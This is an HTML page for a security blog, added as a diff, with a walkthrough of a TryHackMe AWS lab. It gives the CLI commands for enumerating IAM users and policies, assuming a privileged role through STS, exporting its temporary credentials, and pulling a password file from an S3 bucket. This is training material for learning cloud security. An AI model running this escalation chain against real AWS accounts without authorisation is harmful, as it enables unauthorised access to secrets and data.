@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>TryHackMe Advent of Cyber 2025 Day 23 | S3cret Santa — m0rn1ngstr</title>
+  <meta name="description" content="AWS enumeration, IAM permissions, role assumption, and S3 bucket access. TryHackMe Advent of Cyber 2025 Day 23 walkthrough." />
+  <link rel="stylesheet" href="../style.css" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/tabler-icons.min.css" />
+  <style>
+    .cmd-block { background:var(--surface); border:0.5px solid var(--border); border-radius:8px; overflow:hidden; margin-bottom:12px; }
+    .cmd-header { display:flex; justify-content:space-between; align-items:center; padding:7px 14px; border-bottom:0.5px solid var(--border); background:var(--surface2); }
+    .cmd-label { font-family:'JetBrains Mono',monospace; font-size:11px; color:var(--text-muted); }
+    .cmd-copy { font-family:'JetBrains Mono',monospace; font-size:10px; color:var(--mint); background:none; border:none; cursor:pointer; opacity:0.7; letter-spacing:0.5px; }
+    .cmd-copy:hover { opacity:1; }
+    .cmd-body { padding:12px 14px; font-family:'JetBrains Mono',monospace; font-size:12px; line-height:1.7; color:var(--mint); overflow-x:auto; white-space:pre; }
+    .cmd-comment { color:var(--text-muted); }
+    .ts-list { list-style:none; }
+    .ts-list li { display:flex; gap:12px; align-items:baseline; padding:8px 0; border-bottom:0.5px solid var(--border); font-size:13px; }
+    .ts-list li:last-child { border-bottom:none; }
+    .ts-time { font-family:'JetBrains Mono',monospace; font-size:11px; color:var(--red); min-width:40px; flex-shrink:0; }
+    .lab-card { background:var(--surface); border:0.5px solid var(--border); border-radius:8px; padding:10px 12px; margin-bottom:7px; text-decoration:none; display:block; transition:border-color 0.2s; }
+    .lab-card:hover { border-color:var(--red); }
+    .res-link { display:flex; align-items:center; gap:8px; padding:8px 10px; border-radius:6px; border:0.5px solid var(--border); margin-bottom:6px; text-decoration:none; transition:border-color 0.2s; background:var(--surface); }
+    .res-link:hover { border-color:var(--purple); }
+    a.card, a.card:visited { color: var(--text); }
+  </style>
+</head>
+<body>
+
+<nav>
+  <a class="nav-logo" href="../index.html">m0rn1ngstr<span>.</span></a>
+  <div class="nav-links">
+    <a href="../about.html">about</a>
+    <a href="../videos.html" class="active">videos</a>
+    <a href="../work.html">work</a>
+  </div>
+</nav>
+
+<div style="padding:0.9rem 2rem; font-family:'JetBrains Mono',monospace; font-size:11px; color:var(--text-muted); border-bottom:0.5px solid var(--border); display:flex; align-items:center; gap:8px;">
+  <a href="../index.html" style="color:var(--text-muted); text-decoration:none;">home</a>
+  <span style="color:var(--red); opacity:0.5;">/</span>
+  <a href="../videos.html" style="color:var(--text-muted); text-decoration:none;">videos</a>
+  <span style="color:var(--red); opacity:0.5;">/</span>
+  <span style="color:var(--text);">thm-aoc2025-day23-s3cret-santa</span>
+</div>
+
+<div style="max-width:1060px; margin:0 auto; display:grid; grid-template-columns:1fr 280px; gap:0;">
+
+  <!-- MAIN -->
+  <main style="padding:2.5rem 2rem; border-right:0.5px solid var(--border);">
+
+    <div style="display:flex; align-items:center; gap:8px; flex-wrap:wrap; margin-bottom:1rem;">
+      <span class="badge badge-hof" style="font-size:11px; padding:4px 10px;">AWS</span>
+      <span class="badge badge-neutral" style="font-size:11px; padding:4px 10px;">Cloud</span>
+      <span class="badge badge-neutral" style="font-size:11px; padding:4px 10px;">TryHackMe</span>
+      <span class="badge badge-neutral" style="font-size:11px; padding:4px 10px;">Beginner</span>
+    </div>
+
+    <h1 style="font-size:1.6rem; font-weight:300; line-height:1.2; letter-spacing:-0.5px; margin-bottom:0.4rem;">TryHackMe Advent of Cyber 2025 Day 23 | S3cret Santa</h1>
+    <div style="font-family:'JetBrains Mono',monospace; font-size:12px; color:var(--text-muted); margin-bottom:1.5rem;">// published · 2025-12-23</div>
+
+    <!-- VIDEO THUMBNAIL -->
+    <a href="https://www.youtube.com/watch?v=REyPZiWrO0c" target="_blank"
+       style="display:block; width:100%; aspect-ratio:16/9; margin-bottom:2rem; border-radius:8px; overflow:hidden; border:0.5px solid var(--border); position:relative; text-decoration:none;">
+      <img src="https://img.youtube.com/vi/REyPZiWrO0c/maxresdefault.jpg"
+           alt="TryHackMe Advent of Cyber 2025 Day 23 S3cret Santa"
+           style="width:100%; height:100%; object-fit:cover; display:block;">
+      <div style="position:absolute; inset:0; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,0.25);">
+        <div style="width:64px; height:64px; border-radius:50%; background:var(--red); display:flex; align-items:center; justify-content:center;">
+          <i class="ti ti-player-play" style="color:#fff; font-size:24px; margin-left:3px;"></i>
+        </div>
+      </div>
+    </a>
+
+    <div class="section-head">overview</div>
+    <p style="font-size:14px; line-height:1.75; color:var(--text-muted); margin-bottom:2.5rem;">
+      Day 23 of TryHackMe Advent of Cyber 2025 — a beginner-friendly AWS challenge that walks through
+      a realistic cloud attack scenario. Starting from an IAM user with limited permissions, we enumerate
+      the environment, discover an assumable role with broader access, pivot into it using
+      <strong style="color:var(--text); font-weight:500;">STS AssumeRole</strong>, and ultimately
+      reach sensitive data stored in an <strong style="color:var(--text); font-weight:500;">S3 bucket</strong>.
+      A solid introduction to AWS privilege escalation through IAM misconfigurations.
+    </p>
+
+    <div style="height:0.5px; background:var(--border); margin:2rem 0;"></div>
+
+    <div class="section-head">what you'll learn</div>
+    <div style="display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:8px; margin-bottom:2.5rem;">
+      <div style="background:var(--surface); border:0.5px solid var(--border); border-radius:6px; padding:10px 12px; font-size:12px; color:var(--text-muted); line-height:1.5;">
+        <strong style="color:var(--text); font-weight:500; display:block; margin-bottom:2px;">IAM fundamentals</strong>
+        Users, roles, groups, policies — inline vs managed
+      </div>
+      <div style="background:var(--surface); border:0.5px solid var(--border); border-radius:6px; padding:10px 12px; font-size:12px; color:var(--text-muted); line-height:1.5;">
+        <strong style="color:var(--text); font-weight:500; display:block; margin-bottom:2px;">STS AssumeRole</strong>
+        Pivoting from one IAM identity to another
+      </div>
+      <div style="background:var(--surface); border:0.5px solid var(--border); border-radius:6px; padding:10px 12px; font-size:12px; color:var(--text-muted); line-height:1.5;">
+        <strong style="color:var(--text); font-weight:500; display:block; margin-bottom:2px;">S3 enumeration</strong>
+        Listing buckets, objects, and retrieving files
+      </div>
+      <div style="background:var(--surface); border:0.5px solid var(--border); border-radius:6px; padding:10px 12px; font-size:12px; color:var(--text-muted); line-height:1.5;">
+        <strong style="color:var(--text); font-weight:500; display:block; margin-bottom:2px;">AWS CLI basics</strong>
+        Profile setup, credential export, identity checks
+      </div>
+    </div>
+
+    <div style="height:0.5px; background:var(--border); margin:2rem 0;"></div>
+
+    <div class="section-head">commands used</div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">verify current identity</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `aws sts get-caller-identity`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># always start here — confirms which account, user, and ARN you're operating as</span>
+aws sts get-caller-identity</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">enumerate iam users</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `aws iam list-users`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># list all IAM users in the account — note usernames for further enumeration</span>
+aws iam list-users</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">enumerate user's groups and policies</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `aws iam list-groups-for-user --user-name sir.carrotbane\naws iam list-user-policies --user-name sir.carrotbane\naws iam list-attached-user-policies --user-name sir.carrotbane`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># find which groups the user belongs to — groups can inherit permissions</span>
+aws iam list-groups-for-user --user-name sir.carrotbane
+
+<span class="cmd-comment"># list-user-policies = inline policies (embedded directly on the user)</span>
+aws iam list-user-policies --user-name sir.carrotbane
+
+<span class="cmd-comment"># list-attached-user-policies = managed policies (reusable, attached from outside)</span>
+aws iam list-attached-user-policies --user-name sir.carrotbane</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">read the inline policy document</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `aws iam get-user-policy --policy-name SirCarrotbanePolicy --user-name sir.carrotbane`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># retrieves the full JSON policy — look for sts:AssumeRole permissions
+# that's the key to pivoting to a more privileged identity</span>
+aws iam get-user-policy \
+  --policy-name SirCarrotbanePolicy \
+  --user-name sir.carrotbane</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">enumerate iam roles and target role policies</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `aws iam list-roles\naws iam list-role-policies --role-name bucketmaster\naws iam list-attached-role-policies --role-name bucketmaster\naws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># list all roles — look for assumable roles with interesting names or permissions</span>
+aws iam list-roles
+
+<span class="cmd-comment"># enumerate inline and managed policies on the target role</span>
+aws iam list-role-policies --role-name bucketmaster
+aws iam list-attached-role-policies --role-name bucketmaster
+
+<span class="cmd-comment"># read the full policy — confirm this role has S3 access before assuming it</span>
+aws iam get-role-policy \
+  --role-name bucketmaster \
+  --policy-name BucketMasterPolicy</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">assume the role — pivot to bucketmaster</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `aws sts assume-role \\\n  --role-arn arn:aws:iam::123456789012:role/bucketmaster \\\n  --role-session-name scb-bm`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># AssumeRole returns temporary credentials: AccessKeyId, SecretAccessKey, SessionToken
+# replace the ARN with the actual account ID from your environment</span>
+aws sts assume-role \
+  --role-arn arn:aws:iam::123456789012:role/bucketmaster \
+  --role-session-name scb-bm</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">export temporary credentials</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `export AWS_ACCESS_KEY_ID=&quot;ASIA********&quot;\nexport AWS_SECRET_ACCESS_KEY=&quot;tAcT2P****&quot;\nexport AWS_SESSION_TOKEN=&quot;FQoGZXIvYXd********g6WqA=&quot;`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># paste the values from the assume-role output above
+# once exported, all subsequent aws commands run as bucketmaster</span>
+export AWS_ACCESS_KEY_ID="ASIA********"
+export AWS_SECRET_ACCESS_KEY="tAcT2P****"
+export AWS_SESSION_TOKEN="FQoGZXIvYXd********g6WqA="</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">verify new identity and access s3</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `aws sts get-caller-identity\naws s3api list-buckets\naws s3api list-objects --bucket easter-secrets-123145\naws s3api get-object --bucket easter-secrets-123145 --key cloud_password.txt cloud_password.txt\nls\ncat cloud_password.txt`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># confirm you're now operating as bucketmaster</span>
+aws sts get-caller-identity
+
+<span class="cmd-comment"># list all accessible buckets under the new role</span>
+aws s3api list-buckets
+
+<span class="cmd-comment"># enumerate objects inside the target bucket</span>
+aws s3api list-objects --bucket easter-secrets-123145
+
+<span class="cmd-comment"># download the file — --key is the object path, last arg is local filename</span>
+aws s3api get-object \
+  --bucket easter-secrets-123145 \
+  --key cloud_password.txt \
+  cloud_password.txt
+
+<span class="cmd-comment"># verify the file downloaded and read its contents</span>
+ls
+cat cloud_password.txt</div>
+    </div>
+
+  </main>
+
+  <!-- SIDEBAR -->
+  <aside style="padding:2.5rem 1.5rem;">
+
+    <div style="margin-bottom:2rem;">
+      <div class="section-head">labs to practice</div>
+      <a href="https://tryhackme.com/room/cloudenum-aoc2025-y4u7i0o3p6" target="_blank" class="lab-card">
+        <div style="font-family:'JetBrains Mono',monospace; font-size:10px; color:var(--red); letter-spacing:1px; margin-bottom:3px;">TryHackMe</div>
+        <div style="font-size:12px; font-weight:500; color:var(--text);">AWS Security — S3cret Santa</div>
+        <div style="font-size:11px; color:var(--text-muted); margin-top:2px;">beginner · IAM + S3</div>
+      </a>
+      <a href="https://pathfinding.cloud/labs/?service=s3" target="_blank" class="lab-card">
+        <div style="font-family:'JetBrains Mono',monospace; font-size:10px; color:var(--red); letter-spacing:1px; margin-bottom:3px;">PathFinding.cloud</div>
+        <div style="font-size:12px; font-weight:500; color:var(--text);">S3 Labs</div>
+        <div style="font-size:11px; color:var(--text-muted); margin-top:2px;">various · S3 misconfigurations</div>
+      </a>
+    </div>
+
+    <div style="margin-bottom:2rem;">
+      <div class="section-head">resources</div>
+      <a href="https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html" target="_blank" class="res-link">
+        <i class="ti ti-book" style="font-size:14px; color:var(--text-muted); flex-shrink:0;"></i>
+        <div>
+          <div style="font-size:12px; font-weight:500; color:var(--text);">HackTricks — AWS Security</div>
+          <div style="font-size:11px; color:var(--text-muted);">cloud.hacktricks.wiki</div>
+        </div>
+      </a>
+    </div>
+
+    <div style="margin-bottom:2rem;">
+      <div class="section-head">relevant certs</div>
+      <div style="display:flex; flex-wrap:wrap; gap:6px;">
+        <span class="cert-pill">ARTE</span>
+      </div>
+    </div>
+
+    <div>
+      <div class="section-head">more videos</div>
+      <a href="aws-lambda-function-urls.html" class="card" style="display:flex; gap:10px; align-items:flex-start; padding:10px; text-decoration:none; margin-bottom:7px;">
+        <div style="width:52px; height:36px; border-radius:4px; overflow:hidden; flex-shrink:0;">
+          <img src="https://img.youtube.com/vi/gbvrplPAPAI/mqdefault.jpg"
+               style="width:100%; height:100%; object-fit:cover; display:block;">
+        </div>
+        <div>
+          <div style="font-family:'JetBrains Mono',monospace; font-size:9px; color:var(--red); letter-spacing:1px; text-transform:uppercase;">AWS · Cloud</div>
+          <div style="font-size:11px; font-weight:500; color:var(--text); line-height:1.35; margin-top:2px;">Breaking Down AWS Lambda Function URLs as a Pentester</div>
+        </div>
+      </a>
+    </div>
+
+  </aside>
+</div>
+
+<footer>
+  <div class="footer-links">
+    <a href="https://youtube.com/@m0rn1ngstr" target="_blank"><i class="ti ti-brand-youtube"></i> YouTube</a>
+    <a href="https://x.com/m0rn1ngstr" target="_blank"><i class="ti ti-brand-x"></i> X</a>
+    <a href="https://www.linkedin.com/in/katerina-shevchenko01/" target="_blank"><i class="ti ti-brand-linkedin"></i> LinkedIn</a>
+  </div>
+  <span>// hello, friend. &copy; 2026 m0rn1ngstr</span>
+</footer>
+
+<script>
+  function copyCmd(btn, text) {
+    navigator.clipboard.writeText(text).then(() => {
+      const orig = btn.textContent;
+      btn.textContent = 'copied!';
+      setTimeout(() => btn.textContent = orig, 1500);
+    });
+  }
+</script>
+
+</body>
+</html>
